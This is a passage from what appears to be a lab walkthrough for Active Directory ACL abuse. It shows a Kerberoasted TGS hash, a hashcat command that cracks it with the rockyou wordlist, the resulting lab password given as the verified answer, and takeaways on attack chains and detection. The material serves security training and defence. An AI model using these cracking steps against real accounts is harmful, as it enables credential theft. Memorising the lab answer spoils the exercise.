E049270E4D470209FD92AA7331A7CAF734BE5D834C0D6E4F6BD23C9F7556008F7BCA7291567B4C3D9270AB3E190531D221029277E85D785B7D3850D8A9B03A03EAF7B6E1BB0FFA4EB476F433D032EA993EED03A14227BB4879B4FD76B579799CF7CB093EBE27B7CC21A92451E43C274CF26161BCFEA1DFCA8249F6D91FF7CF4CF33384EF1969409B65D5290B0991F9D34866CD0F38F0DF37E858CF78FFF6A4C1E5A0C84E8CC2E2340D7A5FBC61F3B836CDC7D7909279F1CBDBE84DD069808E1BFC7CD01CC9449B73705611FBFC5DDCCAA9CC308B2591B1AD9BB428956A4EB7A88B54273A5008D6F52A65A036D283111D539C2D19EE7611EE1822F1749E6173876D9107086C6A93265AB49ED9D463B76F03F579C8E99E9AB5899C5FA0D29BC7B73180444D101F7BA048E8309AED360D933CFF20561E5AF5D3F2F1049448D1C4BE2FF341992C9BF0A9232C2FEF51AAE507306B7B46DEC98652ECED93F787CBAD674F8B2ACC7909C914E995729FB476CA02C4FF90D9C146ADD22DB762BC183C00514B234032DF753C73FCD74B28A18EDA9516F2300D634E551828DEB8ECD26C14FFB8A6D9EAFBEAE9732E4E2DD767FC50CC7CD3CAF10C0DFB2FF3D9836CB79F9DD886EE7C95E85A75B1A70FB32C8527E99C3055CAEE0775F7375C00B1A207802F368981DD16197718884C48AEFC47CEAF0E46413CAAD45AF4F5D8478F65485E62A5655ABC9B35A38E24BDD8A426B0F1AC208DFEF8239E2EAB3C43B26FF4925B3FD6EB85C294D733EFF97E9DB6E50C0D0B398744B74A998FC01083DF41D7F6C26CF9F203E5ED0F7BE33E76EBAE2D27D4A282289B8718CE76E03DF0549005875111957FA0A28B85A869DD18F9774850DEC55142876391B3EC293EFADB2D32808CA89C91090DA1A8E569F50F7EDBF0036DBE732E776CED446EAB9704A1DE14C3BA17898381165852AE928A01FD158C4C77368B73A47FD3F6BF8A1884C09D' > hash.txt

# Crack with Hashcat using mode 13100
hashcat -m 13100 -w 3 -O hash.txt /usr/share/wordlists/rockyou.txt
```

**Real Hashcat Output:**
```bash
┌─[us-academy-1]─[10.10.14.135]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ hashcat -m 13100 -w 3 -O hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...

<SNIP>

$krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$notahacker/LEGIT@INLANEFREIGHT.LOCAL*$d4cac857ed8f6b9bd4df91e0dca95ab1$b5b1908355b367e199b8cc4d6e34f6c83c7c49318da7f3f8ec5342d025081c8a4b25b07c898f4a787a9b27342fbe0adac91dcba6850e17452f5b6fd7599ce32ad5da3f1c93a3b7dbb37d45941c3682a6bf301cc503d95063580b73eea3c2dc11130c0da7d9b4f3908b5d5ee3609b1c2cfd3050ec225f8774d86f92676a8209a875f3f7ae9c991628741fc93a727a2c4684181038a586328df02e7f68c67e8cee4e948a6fb57c3ab7419a24811e7e95bc1801ba5f70bb0a6464f6a9b9c9351d7a3c4259074b35e4fb82797957f34a314c3e6d0de4c96a0bb52e8678686460742b10b8a1a25d0e2953b4712253ced0d13dab9afd8aba8b4b338364f923f89c9167fe76c37f7527b8ddfd4c0bbfa53be552b11272a81df74d033d9b4fe9bdfa3296efdd9e3301cbc8293401fcff3b7694e8339d56c9e4be5ebde1dad8706e25dd05e2851a1749235a3785658971a692b4f1740a69d2d2f66fa763d551ecbfeffeb8fc54951fc756430c1e550fd0dd8f6900d2af5bf5d381ac77454acdb04779fcd2bda3597d0b7c6a1e7a4c06d1637e81b3810a763086d69e8df0f2d6e56b020eda4cab7ee4f3d61253529ac3f17c546fc6e5eee484f8343bcc2d35a9406b93b64f6d31b5a649ead1c9b6bc71db2ec82cfe5dc77285cd5941da79111a0d97efe049270e4d470209fd92aa7331a7caf734be5d834c0d6e4f6bd23c9f7556008f7bca7291567b4c3d9270ab3e190531d221029277e85d785b7d3850d8a9b03a03eaf7b6e1bb0ffa4eb476f433d032ea993eed03a14227bb4879b4fd76b579799cf7cb093ebe27b7cc21a92451e43c274cf26161bcfea1dfca8249f6d91ff7cf4cf33384ef1969409b65d5290b0991f9d34866cd0f38f0df37e858cf78fff6a4c1e5a0c84e8cc2e2340d7a5fbc61f3b836cdc7d7909279f1cbdbe84dd069808e1bfc7cd01cc9449b73705611fbfc5ddccaa9cc308b2591b1ad9bb428956a4eb7a88b54273a5008d6f52a65a036d283111d539c2d19ee7611ee1822f1749e6173876d9107086c6a93265ab49ed9d463b76f03f579c8e99e9ab5899c5fa0d29bc7b73180444d101f7ba048e8309aed360d933cff20561e5af5d3f2f1049448d1c4be2ff341992c9bf0a9232c2fef51aae507306b7b46dec98652eced93f787cbad674f8b2acc7909c914e995729fb476ca02c4ff90d9c146add22db762bc183c00514b234032df753c73fcd74b28a18eda9516f2300d634e551828deb8ecd26c14ffb8a6d9eafbeae9732e4e2dd767fc50cc7cd3caf10c0dfb2ff3d9836cb79f9dd886ee7c95e85a75b1a70fb32c8527e99c3055caee0775f7375c00b1a207802f368981dd16197718884c48aefc47ceaf0e46413caad45af4f5d8478f65485e62a5655abc9b35a38e24bdd8a426b0f1ac208dfef8239e2eab3c43b26ff4925b3fd6eb85c294d733eff97e9db6e50c0d0b398744b74a998fc01083df41d7f6c26cf9f203e5ed0f7be33e76ebae2d27d4a282289b8718ce76e03df0549005875111957fa0a28b85a869dd18f9774850dec55142876391b3ec293efadb2d32808ca89c91090da1a8e569f50f7edbf0036dbe732e776ced446eab9704a1de14c3ba17898381165852ae928a01fd158c4c77368b73a47fd3f6bf8a1884c09d:SyncMaster757
```

**🎯 Verified Answer: `SyncMaster757`**

---

## 📋 **Key Takeaways**

### **Attack Chain Mastery**
1. **Multi-step Exploitation**: Complex attack paths requiring multiple privilege escalations
2. **ACL Dependency**: Each step depends on previously discovered ACL permissions
3. **Stealth Techniques**: Using Kerberoasting instead of direct password changes for high-value targets
4. **Cleanup Importance**: Proper cleanup prevents detection and maintains professional standards

### **Technical Skills Developed**
- **PowerView Mastery**: Advanced PowerShell AD manipulation
- **Credential Management**: PSCredential objects and secure string handling
- **Group Manipulation**: Strategic group membership modifications
- **Kerberoasting**: SPN manipulation and TGS ticket extraction
- **Hash Cracking**: Offline password recovery techniques

### **Defensive Insights**
- **Event Monitoring**: Critical Event IDs for ACL abuse detection
- **SDDL Analysis**: Converting security descriptors to human-readable format
- **Audit Policies**: Proper logging configuration for detection
- **Regular Auditing**: Automated ACL and group membership monitoring

### **Professional Considerations**
- **Documentation**: Every change must be documented for client
- **Cleanup Procedures**: Critical for maintaining client trust
- **Impact Assessment**: Understanding potential disruption of admin accounts
- **Communication**: Coordinating with client for sensitive changes

**🔑 This represents the practical culmination of ACL enumeration - from discovery to exploitation to cleanup - demonstrating complete adversarial simulation capabilities in enterprise Active Directory environments.**

--- 